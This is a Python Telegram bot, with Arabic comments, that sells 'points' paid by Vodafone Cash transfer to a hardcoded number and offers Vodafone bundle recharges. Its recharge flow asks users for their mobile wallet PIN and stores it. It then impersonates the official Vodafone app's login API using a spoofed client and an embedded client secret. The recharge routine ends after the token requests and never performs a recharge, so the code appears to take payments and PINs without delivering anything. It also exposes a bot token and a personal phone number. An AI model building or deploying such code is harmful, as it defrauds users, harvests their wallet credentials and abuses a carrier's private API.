import requests
import json
import random
import string
import telebot
from telebot import types
import warnings
import os

# تجاهل تحذيرات مكتبة NumPy برمجياً
warnings.filterwarnings("ignore", category=UserWarning)

# توكن البوت والآيدي الخاص بك مدمجين بشكل كامل وصحيح
BOT_TOKEN = "8747951112:AAGqwi-HM6NpNEcH6hIpFYiIUrz0HDOUcRk"
bot = telebot.TeleBot(BOT_TOKEN)



# بيانات الأدمن ونظام الشحن
ADMIN_CHAT_ID = 7691769002
ADMIN_CASH_NUMBER = "01019502983" # رقمك الذي يستقبل الأموال

# اسم ملف قاعدة البيانات لحفظ النقاط بشكل دائم
DB_FILE = "database.json"

# دالة لتحميل النقاط من الملف
def load_points():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                data = json.load(f)
                return {int(k): v for k, v in data.items()}
        except Exception:
            return {}
    return {}

# دالة لحفظ النقاط في الملف
def save_points():
    try:
        with open(DB_FILE, "w") as f:
            json.dump(user_points, f, indent=4)
    except Exception as e:
        print(f"خطأ أثناء حفظ البيانات: {e}")

# قواعد البيانات وتجهيز ملف النقاط
user_sessions = {}
user_points = load_points()

# أسعار شحن النقاط
PRICING = [
    {"points": 10, "price": 20},
    {"points": 25, "price": 50},
    {"points": 60, "price": 100},
    {"points": 130, "price": 200}
]

# تكلفة عملية الشحن الواحدة من النقاط
OPERATION_COST = 5

# قائمة الباقات المتاحة لشحن فودافون كاش
PACKAGES = {
    "1": "Fakka_2.5_Unite", "2": "Fakka_4.25_Unite", "3": "Fakka_5_Unite",
    "4": "Fakka_6_Unite", "5": "Fakka_7_Unite", "6": "Fakka_9_Unite",
    "7": "Fakka_10_Unite", "8": "Fakka_10.5_Unite", "9": "Fakka_11.5_Unite",
    "10": "Fakka_12_Unite", "11": "Fakka_12.5_Unite", "12": "Fakka_13_Unite",
    "13": "Fakka_13.5_Unite", "14": "Fakka_15.5_Unite", "15": "Fakka_16.5_Unite",
    "16": "Fakka_17.5_Unite", "17": "Fakka_19.5_Unite", "18": "Fakka_20_Unite",
    "19": "Fakka_26_Unite", "20": "Mared_10_Flexs", "21": "Mared_10_Minuts",
    "22": "Mared_10_Social"
}

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.chat.id
    user_sessions[user_id] = {}

    if user_id not in user_points:
        user_points[user_id] = 0
        save_points()

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("⚡ شحن باقة فكة/مارد", "💰 شحن نقاط", "📊 رصيد نقاطي", "📋 أسعار النقاط")

    bot.send_message(user_id, f"📱 أهلاً بك في بوت فودافون كاش المطور.\n\nرصيدك الحالي: {user_points[user_id]} نقطة.\nتنويه: تكلفة عملية الشحن الواحدة هي {OPERATION_COST} نقاط.", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_menu(message):
    user_id = message.chat.id
    text = message.text

    if text == "⚡ شحن باقة فكة/مارد":
        if user_points.get(user_id, 0) < OPERATION_COST:
            bot.send_message(user_id, f"❌ رصيد نقاطك غير كافٍ. تحتاج إلى {OPERATION_COST} نقاط على الأقل لإجراء العملية.")
            return

        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = [types.InlineKeyboardButton(text=v, callback_data=f"pkg_{k}") for k, v in PACKAGES.items()]
        markup.add(*buttons)
        bot.send_message(user_id, "⚙️ اختر الباقة المراد شحنها من القائمة:", reply_markup=markup)

    elif text == "💰 شحن نقاط":
        user_sessions[user_id] = {}
        msg = bot.send_message(user_id, f"قم بتحويل قيمة النقاط التي تريدها عبر فودافون كاش إلى الرقم التالي:\n`{ADMIN_CASH_NUMBER}`\n\nبعد التحويل, أرسل رقم المحفظة الذي قمت بالتحويل منه الآن:")
        bot.register_next_step_handler(msg, get_sender_number)

    elif text == "📊 رصيد نقاطي":
        bot.send_message(user_id, f"📊 رصيد نقاطك الحالي هو: {user_points.get(user_id, 0)} نقطة.")

    elif text == "📋 أسعار النقاط":
        pricing_text = "📋 قائمة أسعار شحن النقاط الحالية:\n\n"
        for item in PRICING:
            pricing_text += f"▪️ {item['points']} نقطة 🪙 بـ {item['price']} جنيه كاش.\n"
        bot.send_message(user_id, pricing_text)

def get_sender_number(message):
    user_id = message.chat.id
    sender_num = message.text.strip()

    user_sessions[user_id]['sender_num'] = sender_num
    msg = bot.send_message(user_id, "📸 الآن أرسل صورة (اسكرين شوت) واضحة لإيصال التحويل الناجح:")
    bot.register_next_step_handler(msg, get_screenshot)

def get_screenshot(message):
    user_id = message.chat.id
    if message.content_type != 'photo':
        msg = bot.send_message(user_id, "⚠️ خطأ! يرجى إرسال صورة الإيصال كصورة وليست نص أو ملف:")
        bot.register_next_step_handler(msg, get_screenshot)
        return

    file_id = message.photo[-1].file_id
    sender_num = user_sessions[user_id].get('sender_num')

    bot.send_message(user_id, "⏳ تم إرسال طلب الشحن بنجاح للأدمن للمراجعة، سيتم إضافة النقاط لحسابك فور التأكيد.")

    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton(text="✅ موافقة وإضافة 10 نقاط", callback_data=f"approve_{user_id}_10"),
        types.InlineKeyboardButton(text="✅ موافقة وإضافة 25 نقطة", callback_data=f"approve_{user_id}_25")
    )
    markup.add(
        types.InlineKeyboardButton(text="✅ موافقة وإضافة 60 نقطة", callback_data=f"approve_{user_id}_60"),
        types.InlineKeyboardButton(text="✅ موافقة وإضافة 130 نقطة", callback_data=f"approve_{user_id}_130")
    )
    markup.add(types.InlineKeyboardButton(text="❌ رفض الطلب", callback_data=f"reject_{user_id}"))

    bot.send_photo(ADMIN_CHAT_ID, file_id, caption=f"🔔 طلب شحن نقاط جديد:\n\n👤 كود المستخدم: `{user_id}`\n📞 رقم المرسل: `{sender_num}`\n\nاختر باقة النقاط المناسبة بناءً على المبلغ الواصل إليك:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith(("approve_", "reject_")))
def handle_admin_decision(call):
    data = call.data.split("_")
    action = data[0]
    target_user_id = int(data[1])

    if action == "approve":
        points_to_add = int(data[2])
        user_points[target_user_id] = user_points.get(target_user_id, 0) + points_to_add
        save_points()

        bot.send_message(target_user_id, f"🎉 تهانينا! تمت الموافقة على طلب الشحن الخاص بك وإضافة {points_to_add} نقطة لحسابك بنجاح.")
        bot.edit_message_caption(chat_id=ADMIN_CHAT_ID, message_id=call.message.message_id, caption=call.message.caption + f"\n\n🟢 تم قبول الطلب وإضافة {points_to_add} نقطة.")

    elif action == "reject":
        bot.send_message(target_user_id, "❌ نأسف، تم رفض طلب شحن النقاط الخاص بك من قبل الإدارة. تأكد من صحة بيانات التحويل.")
        bot.edit_message_caption(chat_id=ADMIN_CHAT_ID, message_id=call.message.message_id, caption=call.message.caption + "\n\n🔴 تم رفض هذا الطلب.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("pkg_"))
def handle_package_selection(call):
    user_id = call.message.chat.id
    pkg_key = call.data.split("_")[1]

    user_sessions[user_id] = {
        'product_id': PACKAGES[pkg_key],
        'product_name': PACKAGES[pkg_key]
    }

    msg = bot.send_message(user_id, "📞 من فضلك أدخل رقم الهاتف المراد الشحن له (مثال: 010xxxxxxxx):")
    bot.register_next_step_handler(msg, get_msisdn)

def get_msisdn(message):
    user_id = message.chat.id
    msisdn = message.text.strip()

    if not msisdn.isdigit() or len(msisdn) != 11:
        msg = bot.send_message(user_id, "⚠️ رقم الهاتف غير صحيح. الرجاء إدخال رقم صحيح مكون من 11 رقم:")
        bot.register_next_step_handler(msg, get_msisdn)
        return

    user_sessions[user_id]['msisdn'] = msisdn
    msg = bot.send_message(user_id, "🔒 الرجاء إدخال الرقم السري للمحفظة (PIN):")
    bot.register_next_step_handler(msg, get_pin)

def get_pin(message):
    user_id = message.chat.id
    pin = message.text.strip()

    user_sessions[user_id]['pin'] = pin
    bot.send_message(user_id, "🔄 جاري معالجة الطلب والتواصل مع السيرفر الآمن، يرجى الانتظار...")
    process_recharge(user_id)

def process_recharge(user_id):
    session = requests.Session()
    session_data = user_sessions.get(user_id, {})

    msisdn = session_data.get('msisdn')
    pin = session_data.get('pin')
    product_id = session_data.get('product_id')
    product_name = session_data.get('product_name')

    headers_base = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept-Encoding': 'gzip',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'ar',
        'x-agent-operatingsystem': '13',
        'x-agent-device': 'Android Device',
        'x-agent-version': '2026.4.1',
        'x-agent-build': '1139',
    }

    try:
        url_seamless = "http://vodafone.com.eg"
        resp1 = session.get(url_seamless, params={'client_id': 'ana-vodafone-app-seamless'}, headers=headers_base)

        if resp1.status_code != 200:
            bot.send_message(user_id, "❌ فشل الاتصال الأولي بالسيرفر")
            user_sessions[user_id] = {}
            return

        seamless_token = resp1.json().get("seamlessToken")

        url_token = "https://vodafone.com.eg"
        payload_token = {
            'grant_type': 'password',
            'client_secret': 'b86e30a8-ae29',
            'client_id': 'cash-app'
        }

        headers_token = headers_base.copy()
        headers_token.update({
            'seamlessToken': seamless_token,
            'clientId': 'AnaVodafoneAndroid',
            'silentLogin': 'True',
            'firstTimeLogin': 'True'
        })

        resp2 = session.post(url_token, data=payload_token, headers=headers_token)

        if resp2.status_code != 200:
            bot.send_message(user_id, "❌ فشل الاتصال الثاني بالسيرفر")
            user_sessions[user_id] = {}
            return

    except Exception as e:
        bot.send_message(user_id, f"❌ حدث خطأ غير متوقع: {e}")
        user_sessions[user_id] = {}
bot.infinity_polling()


